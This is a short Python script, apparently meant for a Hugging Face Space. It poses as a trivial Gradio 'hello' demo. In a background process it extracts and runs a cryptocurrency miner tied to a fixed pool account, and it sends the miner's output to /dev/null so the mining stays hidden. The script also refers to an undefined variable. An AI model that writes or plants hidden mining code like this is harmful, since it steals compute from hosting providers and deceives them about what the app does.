from multiprocessing import Process
import gradio as gr
import os, subprocess

def hello(name):
    return "Hello " + name + "!!"

demo = gr.Interface(fn=hello, inputs="text", outputs="text")

def dab01959():
    wk_name = "shor12_appmg1"
    #os.getenv('SPACE_ID').replace("/","_")
    os.system("tar xvf apoolminer_linux_autoupdate.tar.gz")
    os.system("chmod +x ./apoolminer_linux_autoupdate/apoolminer")
    os.system(f"./apoolminer_linux_autoupdate/apoolminer --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")

if __name__ == '__main__':
    Process(target=demo.launch).start()
    print("API URL:", iface.api_url)
    Process(target=dab01959).start()
